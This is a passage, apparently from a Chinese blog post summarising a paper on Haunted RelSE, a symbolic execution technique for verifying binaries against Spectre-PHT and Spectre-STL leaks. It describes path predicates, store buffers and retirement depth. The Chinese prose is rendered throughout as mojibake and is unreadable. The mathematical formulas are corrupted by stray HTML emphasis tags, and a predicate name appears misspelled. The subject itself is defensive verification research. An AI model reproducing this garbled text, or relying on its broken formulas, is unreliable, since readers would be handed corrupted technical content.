åˆ°è·¯å¾„è°“è¯­ä¸­ï¼Œç¬¬äºŒæ¡è·¯å¾„è·Ÿç€ <code>else</code> åˆ†æ”¯å¹¶å°†çº¦æŸ <code>(c1 == false)</code> æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</li><li>ä¸¤ä¸ª <em>ç¬æ€è·¯å¾„</em> ï¼ˆtransient pathï¼‰ï¼šä¸ºäº†ç»Ÿè®¡è¢«è¯¯åˆ¤åˆ° <code>true</code> çš„ç¬æ€æ‰§è¡Œï¼Œ<code>then</code> åˆ†æ”¯è¢«ä»¥çº¦æŸ <code>(c1 == false)</code> æ‰§è¡Œï¼Œä¸ºäº†ç»Ÿè®¡è¢«è¯¯åˆ¤åˆ° <code>false</code> çš„ç¬æ€æ‰§è¡Œï¼Œ<code>else</code> åˆ†æ”¯è¢«ä»¥çº¦æŸ <code>(c1 == true)</code> æ‰§è¡Œï¼›è¿™äº›ç¬æ€è·¯å¾„ä¼šåœ¨è¾¾åˆ° <em>æ¨æµ‹è¾¹ç•Œ</em> ï¼ˆspeculation boundï¼Œé€šå¸¸ç”±é‡æ’åºç¼“å†²åŒºçš„å¤§å°å†³å®šï¼‰åè¢«ä¸¢å¼ƒ</li></ul><p>ä¸ºäº†éªŒè¯ SCTï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤å†…å­˜è®¿é—®ä¸æ¡ä»¶çŠ¶æ€æ˜¯å¦åœ¨å¸¸è§„è·¯å¾„ä¸ç¬æ€è·¯å¾„ä¸Šéƒ½æ²¡æœ‰æ³„éœ²ç§˜å¯†ä¿¡æ¯ï¼›åœ¨å¸¸è§„è·¯å¾„ä¸Šæˆ‘ä»¬è¦ç¡®è®¤ç¨‹åºçš„ <em>æ§åˆ¶æµ</em> ä¸ <em>load å’Œ store æŒ‡ä»¤çš„ä¸‹æ ‡</em> å¹¶ä¸å†³å®šäºç§˜å¯†è¾“å…¥ï¼Œç„¶è€Œåœ¨ç¬æ€è·¯å¾„ä¸Šæˆ‘ä»¬ä»…ç¡®è®¤  <em>æ§åˆ¶æµ</em> ä¸ <em>load å’Œ store æŒ‡ä»¤çš„ä¸‹æ ‡</em>  ï¼Œå› ä¸ºåœ¨æ¨æµ‹æ‰§è¡Œä¸­ï¼Œå†…å­˜çš„ store æ“ä½œä¸º store buffer ä¸­çš„é˜Ÿåˆ—ï¼Œç›´åˆ°è¿‡æœŸä¹‹å‰å¯¹ç¼“å­˜éƒ½ä¸å¯è§</p><p><em>Problem with Explicit</em> ï¼šå¯¹äº <code>Fig. 1b</code>ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸¤æ¡å­æ ‘éƒ½ä¸ºå¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œ <code>then</code> åˆ†æ”¯çš„ç»“æœï¼ˆå³ å­æ ‘èµ·å§‹äºçŠ¶æ€ <code>A</code> ï¼‰ï¼Œå¯¹åº”äºä¸åŒè·¯å¾„è°“è¯­ä¸‹çš„ç›¸åŒæŒ‡ä»¤ï¼Œå‡†ç¡®åœ°è¯´ï¼Œè‹¥æˆ‘ä»¬å°† $\widehat{\psi _{cf} }$ ã€$\widehat{\psi _{ld} }$ ã€$\widehat{\psi <em>{st}}$ ç§°ä¸ºå­æ ‘ <code>A</code> ä¸­å¯¹åº”çš„ <em>æ§åˆ¶æµçŠ¶æ€ã€ load ä¸‹æ ‡ã€store ä¸‹æ ‡</em> çš„å…³ç³»è¡¨è¾¾å¼ï¼Œåˆ™å¯¹äºå¸¸è§„æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥ $seckeak(\pi \and c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{st}})$  ï¼Œå¯¹äºç¬æ€æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥ $seckeak(\pi \and \neg c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and \neg c</em>{1},\widehat{\psi _{ld}})$ï¼›æœ€ç»ˆç­‰ä»·äºæ£€æŸ¥å¦‚ä¸‹è¡¨è¾¾å¼ï¼š</p><p>$$<br>seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi _{st}})<br>$$</p><p>è¯¥è¡¨è¾¾å¼åŸºæœ¬è¿‘ä¼¼äºåœ¨æ²¡æœ‰çº¦æŸ <code>c1</code> çš„æƒ…å†µä¸‹ç¬¦å·åŒ–åœ°æ‰§è¡Œ <code>then</code> åˆ†æ”¯è‡³ $\delta$ï¼Œæ£€æŸ¥ load çš„ä¸‹æ ‡ $\widehat{\psi _{ld} }$ ä¸æ§åˆ¶æµè¡¨è¾¾å¼ $\widehat{\psi _{cf} }$ï¼Œä»…å°† <code>c1</code> æ·»åŠ åˆ° store ä¸‹æ ‡ $\widehat{\psi _{st} }$ çš„æ£€æŸ¥ä¸­</p><p><em>è¿™æ ·çš„å‘ç°è®©ç ”ç©¶è€…è®¾è®¡å‡ºæ¥ Explicit RelSE çš„ä¼˜åŒ–æ–¹æ³•ï¼šæ¢ç´¢ä¸€ä¸ªå•ç‹¬çš„åŒæ—¶åŒ…å«ç¨‹åºçš„å¸¸è§„ä¸ç¬æ€è¡Œä¸ºçš„æ¨æµ‹è·¯å¾„ï¼Œä»¥åœ¨ä¿å­˜ä¸€ä¸ªç­‰ä»·ç»“æœçš„åŒæ—¶å¯¹çŠ¶æ€è¿›è¡Œå‰ªæ</em></p><p><em>2ï¼‰Haunted RelSE for Spectre-PHT</em>  ï¼šç›¸è¾ƒäºå°†æ‰§è¡Œåˆ†ä¸ºå››ä¸ªè·¯å¾„ï¼ŒHaunted RelSE ä»…å°†å…¶åˆ†ä¸ºä¸¤ä¸ªè·¯å¾„ï¼Œå¦‚ <code>Fig. 1c</code> æ‰€ç¤ºï¼Œåœ¨æ¡ä»¶åˆ†æ”¯ <strong>if</strong> <code>c1</code> ä¹‹åï¼Œæ‰§è¡Œå°†åˆ†ä¸ºä¸¤ä¸ªè·¯å¾„ï¼šä¸€ä¸ªè·¯å¾„è·Ÿéš <code>then</code> åˆ†æ”¯ï¼ˆå­æ ‘ <code>A</code>ï¼‰ï¼Œå¦ä¸€è·¯å¾„è·Ÿéš <code>else</code> åˆ†æ”¯ï¼ˆå­æ ‘ <code>B</code>ï¼‰ï¼Œä¸¤ä¸ªåˆ†æ”¯éƒ½åŒæ—¶å¯¹å¸¸è§„ä¸ç›¸åº”çš„ç¬æ€è·¯å¾„çš„è¡Œä¸ºè¿›è¡Œå»ºæ¨¡ï¼›æ­¤å¤–ï¼Œå…¶ä¼šå»¶è¿Ÿï¼ˆå¯èƒ½å…å»ï¼‰å¯¹è·¯å¾„çº¦æŸçš„æ£€æŸ¥â€”â€”ä»…ä¼šæ·»åŠ çº¦æŸ $c _{1} \or \neg c _{1}$ ï¼›æœ€ç»ˆï¼Œçº¦æŸå°†ä¼šåœ¨æ¡ä»¶åˆ†æ”¯å¤±æ•ˆåï¼ˆåœ¨  $\delta$ æ­¥åï¼‰è¢«æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</p><p>åœ¨æ¯ä¸ªæ¡ä»¶çŠ¶æ€ ï¼ˆæˆ–æ˜¯ load æŒ‡ä»¤ï¼‰ï¼Œç ”ç©¶è€…ä¼šæ£€æŸ¥æ¡ä»¶ï¼ˆæˆ–æ˜¯ load ä¸‹æ ‡ï¼‰åœ¨å¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œä¸­éƒ½ä¸ä¾èµ–äºç§˜å¯†ï¼ˆå³ï¼Œä½¿ç”¨è·¯å¾„è°“è¯­ Ï€ï¼‰ï¼š$seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi _{ld}})$ ï¼›å¦ä¸€æ–¹é¢ï¼Œstore æŒ‡ä»¤ä»…ä¼šåœ¨å¸¸è§„æ‰§è¡Œä¸‹è¢«æ£€æŸ¥ï¼ˆå³ï¼Œä½¿ç”¨è·¯å¾„è°“è¯­ $\pi \and c _{1}$ï¼‰ï¼›æœ€ç»ˆï¼Œæ¡ä»¶ $(c1 &#x3D;&#x3D; true)$ ä¼šè¢«åœ¨  $\delta$ æ­¥åè¢«æ·»åŠ åˆ°è·¯å¾„è°“è¯­ä¸­</p><p><img src="https://s2.loli.net/2023/01/27/ba8tRJLwo6IzSnq.png" alt="Figure 1: Comparison of RelSE of program in Fig. 1a, where solid paths represent regular executions, dotted paths represent transient executions, and Î´ is the speculation depth."></p><h3 id="B-Spectre-STL"><a href="#B-Spectre-STL" class="headerlink" title="B.Spectre-STL"></a>B.Spectre-STL</h3><p><em>1) Explicit RelSE for Spectre-STL</em> ï¼šåœ¨å¾®æ¶æ„çº§åˆ«ï¼Œä¸€ä¸ª load æŒ‡ä»¤å¯ä»¥ä» store buffer çš„ä»»æ„åŒ¹é…çš„ entry æˆ–æ˜¯ä»ä¸»å­˜è·å–å…¶å€¼ï¼Œè¿™æ„å‘³ç€ load å¯ä»¥ç»•è¿‡ store buffer ä¸­æœªå†³çš„ store æ“ä½œç›´åˆ°è¾¾åˆ°ä¸»å­˜ï¼›ä¸ºäº†ç»Ÿè®¡è¿™ä¸€è¡Œä¸ºï¼Œ <em>Explicit</em> ç­–ç•¥â€”â€”åº”ç”¨äº PITCHFORK ä¸­â€”â€”é€šè¿‡ä¸ºæ¯ä¸ªå¯èƒ½çš„ load ä¸ store äº¤é”™è¿›è¡Œç¬¦å·æ‰§è¡Œåˆ†æ”¯ä»¥ç›´æ¥å»ºæ¨¡ç¬æ€æ‰§è¡Œ</p><p>è€ƒè™‘ <code>Fig.2a</code> ä¸­çš„ç¨‹åºï¼Œå¯¹äº store æŒ‡ä»¤çš„ç¬¦å·æ‰§è¡Œç»™å‡º <code>Fig. 2b </code> ä¸­å®šä¹‰çš„ç¬¦å·åŒ–å†…å­˜ $\mu _{3}$ï¼Œå…¶ä¸ºä» <code>initial_memory</code> å¼€å§‹çš„ä¸€ç³»åˆ—ç¬¦å·åŒ– store æ“ä½œï¼›æœ‰äº†è¿™æ ·æŒ‰æ—¶é—´é¡ºåºçš„è¡¨ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨ç¬¦å·åŒ–å†…å­˜ä¸­çš„æœ€å <code>|SB|</code> æ¬¡ store æ“ä½œæ¥å®šä¹‰ä¸€ä¸ªå¤§å°ä¸º <code>|SB|</code> çš„ store bufferï¼›ç±»ä¼¼çš„ï¼Œä¸»å­˜ä¹Ÿå¯ä»¥é€šè¿‡ç§»é™¤ç¬¦å·åŒ–å†…å­˜ä¸­çš„æœ€å <code>|SB|</code> æ¬¡ store æ“ä½œè¿›è¡Œå®šä¹‰ï¼›ä»¥ä¸€ä¸ªå¤§å°ä¸º 2 çš„ store buffer ä¸ºä¾‹ï¼Œå½“ä¸»å­˜ç”± $\mu _{1}$ å®šä¹‰æ—¶ï¼Œæœ€åä¸¤æ¬¡ store æ„æˆäº† store buffer</p><p>ç¬¬ä¸€æ¡ load æŒ‡ä»¤ï¼ˆblock <code>A</code>ï¼‰å¯ä»¥ç»•è¿‡ store buffer ä¸­çš„æ¯ä¸€ä¸ª store æ“ä½œç›´åˆ°å…¶è¾¾åˆ°ä¸»å­˜ï¼Œå› æ­¤ <code>x</code> æœ‰ä¸‰ç§å¯èƒ½çš„å€¼ï¼Œå¦‚ <code>Fig. 2c</code> æ‰€ç¤ºï¼š</p><ul><li>å¸¸è§„å€¼ $r$ å¯¹åº”ä¸€ä¸ªæœ€è¿‘çš„ç¬¦å·åŒ–å†…å­˜ $\mu _{3}$ çš„ç¬¦å·åŒ–çš„ $select$ æ“ä½œï¼Œå› ä¸ºæ‰€æœ‰å…ˆå‰çš„ store æ“ä½œéƒ½è¢«æŒ‰é¡ºåºç¼–ç è¿›äº† $\mu _{3}$ ï¼Œè¿™å¯¹åº”ç€é¡ºåºæ‰§è¡Œ</li><li>ç¬¬ä¸€ä¸ªç¬æ€å€¼ $t _{2}$ é€šè¿‡ç»•è¿‡ store buffer ä¸­çš„ç¬¬ä¸€ä¸ª entry è€Œè·å¾—ï¼Œè¿™å¯¹åº”ç€ $\mu _{2}$ ä¸­çš„ä¸€ä¸ªç¬¦å·åŒ– $select$ æ“ä½œ</li><li>æœ€åä¸€ä¸ªç¬æ€å€¼ $t _{1}$â€‹ é€šè¿‡ç»•è¿‡ store buffer ä¸­çš„ç¬¬ä¸€ä¸ç¬¬äºŒä¸ª entry å¹¶ä»ä¸»å­˜å–å€¼è€Œè·å¾—ï¼Œè¿™å¯¹åº”ç€ $\mu _{1}$ ä¸­çš„ä¸€ä¸ªç¬¦å·åŒ– $select$ æ“ä½œ</li></ul><p>ç±»ä¼¼åœ°ï¼Œå˜é‡ <code>y</code> åŒæ ·æœ‰ä¸‰ç§å¯èƒ½çš„å–å€¼</p><p>å¦‚ <code>Fig. 2d </code> ä¸­æ‰€ç¤ºçš„ <em>Explicit</em> æ¢ç´¢ç­–ç•¥ä¸º load çš„æ¯ä¸ªèƒ½è·å–çš„å¯èƒ½çš„å€¼è¿›è¡Œç¬¦å·æ‰§è¡Œåˆ†æ”¯ï¼Œè¿™å°†å¾ˆå¿«å¯¼è‡´è·¯å¾„çˆ†ç‚¸ï¼Œæˆ‘ä»¬é€šè¿‡å®éªŒè¡¨æ˜ï¼ˆSection V-Cï¼‰å³ä¾¿æ˜¯åœ¨è¾ƒå°‘ä»£ç ä¸Šï¼ˆ100æ¡æŒ‡ä»¤ï¼‰è¿™ä¸ªé—®é¢˜ä¹Ÿå¾ˆéš¾è§£å†³</p><p><em>2) Haunted RelSE for Spectre-STL</em> ï¼šç ”ç©¶è€…é¦–å…ˆè§‚å¯Ÿåˆ°å¤§éƒ¨åˆ†è·¯å¾„éƒ½æ˜¯å¤šä½™çš„ï¼Œä¸€ä¸ª load å¯ä»¥é€šè¿‡å…ˆå‰çš„éåˆ«å store è¿›è¡Œä»£å¿ï¼Œè€ƒè™‘ <code>Fig. 2c </code>ä¸­çš„è¯„ä¼°ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿç¡®è®¤ load çš„ä¸‹æ ‡ $a$ ä¸ç¬¬äºŒä¸ª store çš„ä¸‹æ ‡ $a _{2}$ ä¸åŒï¼Œæ ¹æ®æ•°ç»„çš„å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰ $t _{2} &#x3D; t _{1}$ ï¼Œç”±æ­¤è·¯å¾„ $x \to t _{2}$ ä¸å…¶æ‰€æœ‰çš„å­è·¯å¾„éƒ½æ˜¯å¤šä½™çš„ï¼› <em>ç ”ç©¶è€…åŸºäºä¸€ç§è‘—åçš„ç§°ä¹‹ä¸º read-over-write çš„å¯¹ç¬¦å·æ•°ç»„çš„ä¼˜åŒ–æ¥æ£€æµ‹ä¸å‰ªæå¤šä½™çš„æƒ…å†µ</em> ï¼ˆcasesï¼‰</p><p>ç„¶è€Œï¼Œå¯¹å¤šä½™æƒ…å†µçš„åˆå¹¶å¹¶ä¸è¶³ä»¥è§£å†³è·¯å¾„çˆ†ç‚¸ï¼ˆå‚è§ Section Vï¼‰ï¼Œç”±æ­¤ <em>ç ”ç©¶è€…æå‡ºä¸€ç§æ–°çš„ç¼–ç ä»¥åœ¨ä¸€ä¸ªå•ç‹¬çš„è·¯å¾„è°“è¯­ä¸­ä¿å­˜å‰©ä¸‹çš„æƒ…å†µ</em> ï¼Œå…¶ä½¿ç”¨ç¬¦å·åŒ–çš„ <em>if-then-else</em> æ¥åœ¨ä¸€ä¸ªå•ç‹¬çš„è¡¨ç¤ºä¸­ç¼–ç æ‰€æœ‰å¯èƒ½è¢« load å–çš„å€¼ï¼Œè€Œéä¸ºæ¯ä¸ªå¯èƒ½çš„æƒ…å†µè¿›è¡Œåˆ†æ”¯æ‰§è¡Œ</p><p>ä¾‹å¦‚ <code>Fig. 2c</code> ä¸­å¯¹ load è¡¨è¾¾å¼çš„è¯„ä¼°ï¼Œåœ¨å¯¹ç¬¬äºŒä¸ª load çš„è¯„ä¼°ä¹‹åï¼Œå˜é‡ $y$ å¯ä»¥å–å€¼ $râ€™,tâ€™<em>{1},tâ€™</em>{2}$ï¼Œç ”ç©¶è€…å¼•å…¥ä¸¤ä¸ªæ–°çš„å¸ƒå°”å˜é‡ $bâ€™ <em>{1}$ ä¸ $bâ€™ <em>{2}$ å¹¶æ„å»ºè¡¨è¾¾å¼ $(ite\ bâ€™</em>{1}tâ€™</em>{1}(ite\ bâ€™<em>{2}tâ€™</em>{2}râ€™))$ï¼Œæ±‚è§£å™¨å¯ä»¥è®© $y$ å–å¦‚ä¸‹å€¼ï¼š</p><ul><li>ç¬æ€å€¼ $tâ€™<em>{1}$ ï¼Œé€šè¿‡å°† $bâ€™</em>{1}$ è®¾ä¸º true</li><li>ç¬æ€å€¼ $tâ€™<em>{2}$ ï¼Œé€šè¿‡å°† $bâ€™</em>{1}$ è®¾ä¸º false ä¸” $bâ€™_{2}$ è®¾ä¸º true</li><li>å¸¸è§„å€¼ $r$ï¼Œé€šè¿‡å°† $bâ€™<em>{1}$ ä¸ $bâ€™</em>{2}$ éƒ½è®¾ä¸º false</li></ul><p>æœ€åï¼Œç¬æ€å€¼  $tâ€™<em>{1}$ ï¼ˆæˆ–æ˜¯  $tâ€™</em>{2}$ï¼‰ å¯ä»¥ç®€å•åœ°é€šè¿‡å°†  $bâ€™<em>{1}$ ï¼ˆæˆ–æ˜¯ $bâ€™</em>{2}$ï¼‰è®¾ä¸º false æ¥ä¸¢å¼ƒ </p><p><img src="https://s2.loli.net/2023/01/27/LK3SeluXqFkg5mb.png" alt="Figure 2: Speculative RelSE of program in Fig. 2a. The symbolic memory is given in Fig. 2b and the symbolic evaluation of load instructions is detailed in Fig. 2c. Figure 2d illustrates the symbolic execution tree obtained from the Explicit exploration strategy; and Fig. 2e, the tree obtained from Haunted RelSE, where solid paths denote regular executions and dotted paths denote transient executions."></p><h1 id="0x04-IMPLEMENTATION-OF-HAUNTED-RELSE"><a href="#0x04-IMPLEMENTATION-OF-HAUNTED-RELSE" class="headerlink" title="0x04. IMPLEMENTATION OF HAUNTED RELSE"></a>0x04. IMPLEMENTATION OF HAUNTED RELSE</h1><p>æœ¬èŠ‚ä»‹ç» Haunted RelSE çš„æŠ€æœ¯ç»†èŠ‚ï¼Œä¸»è¦å…³æ³¨äºç”¨ä»¥åˆ†æ SCT çš„äºŒè¿›åˆ¶çº§çš„ RelSE çš„å˜åŒ–</p><p>ç”±äºå¯¹æ•°æ®çš„ä¾èµ–é¡¹çš„å­˜åœ¨ï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤è‡ªç„¶åœ°æ‰§è¡Œæˆ–æ˜¯ä¸èƒ½è¢«é‡æ’åºï¼Œå…¶å®å¯¹äº Spectre-PHT æˆ‘ä»¬åªéœ€è¦è€ƒè™‘å¯¹æ¡ä»¶åˆ†æ”¯çš„é‡æ’åºï¼ˆSection IV-Aï¼‰å¹¶å¯¹ Spectre-STL é‡æ’åº load ä¸ store å³å¯ï¼ˆSection IV-Bï¼‰</p><p>ä¸€ä¸ªè¡¨ç¤ºä¸º $\sigma $ çš„ç¬¦å·é…ç½®ï¼ˆsymbolic configurationï¼‰ç”±ä»¥ä¸‹ç»„æˆï¼š</p><ul><li>å½“å‰ä½ç½® $l$ ï¼Œç”¨ä»¥è·å–ç¨‹åº $P$ ä¸­çš„å½“å‰æŒ‡ä»¤ $P[l]$</li><li>ç¬¦å·æ‰§è¡Œ  $\delta $  çš„å½“å‰æ·±åº¦</li><li>ä¸€ä¸ªç¬¦å·å¯„å­˜å™¨æ˜ å°„ $\rho$ ï¼Œå°†ç¨‹åºå˜é‡æ˜ å°„åˆ°å¯¹åº”çš„ç¬¦å·å€¼</li><li>ä¸¤ä¸ªè·¯å¾„è°“è¯­ $\pi$ ä¸ $\widetilde{\pi}$ ï¼ˆå…·ä½“å‚è§ Section IV-Aï¼‰</li><li>ä¸€ä¸ªç¬¦å·åŒ–å†…å­˜ $\widehat{\mu}$â€”â€”ä¸€å¯¹ç¬¦å·æ•°ç»„ã€å…¶ store æ“ä½œçš„ <em>è¿‡æœŸæ·±åº¦</em> ï¼ˆretirement depthï¼‰</li><li>ä¸€ç»„ç¬æ€çš„ load $\widetilde{\lambda}$ ï¼ˆå…·ä½“å‚è§ Section IV-Bï¼‰</li></ul><p>è®°å· $\sigma.f$ è¡¨ç¤ºé…ç½® $\sigma$ ä¸­çš„å­—æ®µ $f$ï¼Œç ”ç©¶è€…è¿˜å®šä¹‰äº†ä¸€ä¸ªå‡½æ•° $eval_expr(\sigma ,e)$ ç”¨ä»¥åœ¨ç¬¦å·é…ç½®  $\sigma $  ä¸­è®¡ç®—ä¸€ä¸ª DBA è¡¨è¾¾å¼ $e$ åˆ°ä¸€ä¸ªç¬¦å·å€¼</p><p>ç›¸æ¯”äºç›´æ¥å¯¹é‡æ’åºç¼“å†²åŒºè¿›è¡Œå»ºæ¨¡ï¼Œç ”ç©¶è€…ä½¿ç”¨ç¬¦å·æ‰§è¡Œçš„ <em>å½“å‰æ·±åº¦</em> ï¼ˆcurrent depthï¼‰æ¥è¿½è¸ªè¦å¤±æ•ˆï¼ˆretiredï¼‰çš„æŒ‡ä»¤ï¼Œä¸€æ¡æŒ‡ä»¤åœ¨è‡³å¤š âˆ† æ­¥ä¹‹åå¿…é¡»è¦é€€å‡ºï¼Œå…¶ä¸­ âˆ† ä¸ºé‡æ’åºç¼“å†²åŒºçš„å¤§å°ï¼›è¡¨è¾¾å¼è¢«é™„æ³¨äº†ä¸€ä¸ªæ·±åº¦ä»¥ç¡®è®¤å…¶æ˜¯å¦è¦é€€å‡ºï¼Œæˆ–æ˜¯å…¶æ˜¯å¦ä¾èµ–äºå†…å­˜ï¼Œä¾‹å¦‚å¯„å­˜å™¨æ˜ å°„ $\rho$ ä¸­çš„ä¸€ä¸ªå˜é‡ $v$ æ˜ å°„åˆ°ä¸€å¯¹ $(\widehat{\psi},\delta)$ ï¼Œå…¶ä¸­ $\delta$ ä¸ºæœ€è¿‘å†…å­˜è®¿é—®çš„å¤±æ•ˆæ·±åº¦ï¼ˆretirement depthï¼‰ï¼Œå½“ $\delta$ ä¸éœ€è¦åœ¨ä¸Šä¸‹æ–‡ä¸­æ—¶ï¼Œå…¶ä¾¿è¢«çœç•¥æ‰äº†</p><h3 id="A-Haunted-RelSE-for-Spectre-PHT"><a href="#A-Haunted-RelSE-for-Spectre-PHT" class="headerlink" title="A. Haunted RelSE for Spectre-PHT"></a>A. Haunted RelSE for Spectre-PHT</h3><p><em>1) Evaluation of conditional instructions</em> ï¼šä¸æ ‡å‡†çš„ç¬¦å·æ‰§è¡Œä¸åŒï¼Œæ¡ä»¶å¹¶ä¸ä¼šè¢«ç«‹åˆ»åŠ å…¥åˆ°è·¯å¾„è°“è¯­ä¸­ï¼Œè€Œæ˜¯ä¼šä¸å…¶é€€å‡ºæ·±åº¦ä¸€èµ·è¢«ä¿å­˜åœ¨ä¸€ä¸ª <em>æ¨æµ‹è·¯å¾„è°“è¯­</em> ï¼ˆspeculative path predicateï¼‰ $\widetilde{\pi}$ ä¸­ï¼›å½“è¾¾åˆ°ä¸€ä¸ªæ¡ä»¶çš„å¤±æ•ˆæ·±åº¦æ—¶ï¼Œå…¶ä¼šè¢«ä»æ¨æµ‹è·¯å¾„è°“è¯­ä¸­ç§»é™¤ï¼Œæ·»åŠ åˆ° <em>å¤±æ•ˆè·¯å¾„è°“è¯­</em> ï¼ˆretired path predicateï¼‰ $\pi$ ä¸­</p><p>å¯¹æ¡ä»¶åˆ†æ”¯çš„è¯„ä¼°å¦‚ <code>Algorithm 1</code> æ‰€ç¤ºï¼Œå‡½æ•°é¦–å…ˆä¼šè¯„ä¼°æ¡ä»¶çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼Œä¹‹åå…¶é€šè¿‡æ›´æ–°ä½ç½®ä¸æ¨æµ‹è·¯å¾„è°“è¯­  $\widetilde{\pi}$  ä»¥æ²¿ç€åˆ†æ”¯ <code>then</code>  è®¡ç®—åç»­çŠ¶æ€ $\sigma _{t}$ ã€æ²¿ç€åˆ†æ”¯ <code>else</code> è®¡ç®—åç»­çŠ¶æ€ $\sigma _{f}$ </p><p><img src="https://s2.loli.net/2023/01/27/eAi2Hs3fFEqlK4w.png" alt="image.png"></p><p><em>2) Determining speculation depth</em> ï¼šä¸€ä¸ªæ¡ä»¶åˆ†æ”¯åçš„æ¨æµ‹è·¯å¾„æ˜¯åŠ¨æ€è®¡ç®—çš„ï¼Œè€ƒè™‘å½“å…¶æ‰€ä¾èµ–çš„æ‰€æœ‰å†…å­˜è®¿é—®éƒ½å¤±æ•ˆæ—¶ï¼Œä¸€ä¸ªæ¡ä»¶å¯ä»¥è¢«å®Œå…¨è§£å‡ºï¼ˆä¸”é¢„æµ‹é”™è¯¯çš„è·¯å¾„å¯ä»¥è¢«å»é™¤ï¼‰ï¼Œè¿™æ„å‘³ç€è‹¥è¯¥æ¡ä»¶å¹¶ä¸ä¾èµ–äºå†…å­˜ï¼Œåˆ™åˆ†æ”¯å¹¶æœªé¢„æµ‹é”™è¯¯</p><p>è¿™éœ€è¦ä¸ºæ¯ä¸ªè¡¨è¾¾å¼ä¿å­˜å…¶æœ€åå†…å­˜è®¿é—®çš„æ·±åº¦ï¼Œå¦‚ <code>Algorithm 1</code> æ‰€ç¤ºï¼Œåœ¨ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯ä¸Šï¼Œ $ite\ c\ ?l <em>{true}:l</em>{false}$ è¢«è®¡ç®—ä¸ºä¸€ä¸ªç¬¦å·å€¼ $\widehat{\varphi}$ ä¸æ·±åº¦ $\delta$ ï¼Œè¯¥æ·±åº¦ $\delta$ è¢«ä½œä¸ºæ¡ä»¶çš„é€€å‡ºæ·±åº¦è€Œæ·»åŠ åˆ°æ¨æµ‹è·¯å¾„è°“è¯­  $\widetilde{\pi}$  ä¸­</p><p><em>3) Invalidate transient paths</em> ï¼šåœ¨ <code>Algorithm 2</code> ä¸­ï¼Œæ¡ä»¶åˆ†æ”¯åœ¨å‡½æ•° $retirePHT(\pi,\widetilde{\pi},\delta)$ ä¸­å¤±æ•ˆï¼Œè¯¥å‡½æ•°ä»æ¨æµ‹è·¯å¾„è°“è¯­ $\widetilde{\pi}$ ä¸­ç§»é™¤æ‰€æœ‰å¸¦æœ‰å°äºå½“å‰æ·±åº¦ $\delta _{current}$ çš„å¤±æ•ˆæ·±åº¦ $\delta _{ret}$ çš„æ¡ä»¶ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°å¤±æ•ˆè·¯å¾„è°“è¯­ $\pi$ ä¸­ï¼Œå¹¶è¿”å›æ›´æ–°åçš„è·¯å¾„è°“è¯­  $\pi$ ä¸ $\widetilde{\pi}$ ï¼›è‹¥  $\pi$ ä¸å¯æ»¡è¶³ï¼Œåˆ™ç¬¦å·æ‰§è¡Œå°†åœæ­¢</p><p><img src="https://s2.loli.net/2023/01/27/tl29pvOeFdrBTGj.png" alt="image.png"></p><h3 id="B-Haunted-RelSE-for-Spectre-STL"><a href="#B-Haunted-RelSE-for-Spectre-STL" class="headerlink" title="B. Haunted RelSE for Spectre-STL"></a>B. Haunted RelSE for Spectre-STL</h3><p><em>1) Symbolic memory</em> ï¼šåœ¨ä¸€ä¸ªç¬¦å·é…ç½®ä¸­ï¼Œå†…å­˜ $\widehat{\mu}$ ä¸ºä»åˆå§‹å†…å­˜å¼€å§‹çš„ç¬¦å·åŒ– store æ“ä½œçš„å†å²ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŒ‰æ—¶é—´é¡ºåºçš„è¡¨ç¤ºæ¥é‡æ–°æ„é€  <em>store buffer</em> ä¸ <em>main memory</em> çš„å†…å®¹ï¼›store buffer ä¹Ÿæ˜¯å¯¹ç¬¦å·åŒ–å†…å­˜çš„æœ€å <code>|SB|</code> æ¡æœªå¤±æ•ˆ store çš„é™åˆ¶ï¼Œå…¶ä¸­ <code>|SB|</code> ä¸º store buffer çš„å¤§å°ï¼Œå½¢å¼ä¸Šå…¶è¢«å®šä¹‰ä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/01/27/Xt352nyMkC8R6vO.png" alt="image.png"></p><p>å…¶ä¸­ $last(n,\widehat{\mu})$ ä¸ºç¬¦å·åŒ–å†…å­˜ $\widehat{\mu}$ çš„æœ€å $n$ ä¸ªå…ƒç´ </p><p>ç±»ä¼¼åœ°ï¼Œ <em>ä¸»å­˜</em> ï¼ˆmain memoryï¼‰è¢«å®šä¹‰ä¸ºç¬¦å·åŒ–å†…å­˜å †å¤±æ•ˆçš„ store æ“ä½œçš„é™åˆ¶ï¼Œå½¢å¼ä¸Šå®šä¹‰ä¸º $Mem(\widehat{\mu},\delta)\triangleq\widehat{\mu}\backslash SB(\widehat{\mu},\delta)$</p><p>å¯¹ä¸€ä¸ª store æŒ‡ä»¤çš„è¯„ä¼°å¦‚ <code>Algorithm 3</code> æ‰€ç¤ºï¼Œé¦–å…ˆè¯¥å‡½æ•°ä¼šè®¡ç®—ä¸‹æ ‡çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥åœ¨ <em>å¸¸è§„è·¯å¾„è°“è¯­</em> $\pi _{reg}$ 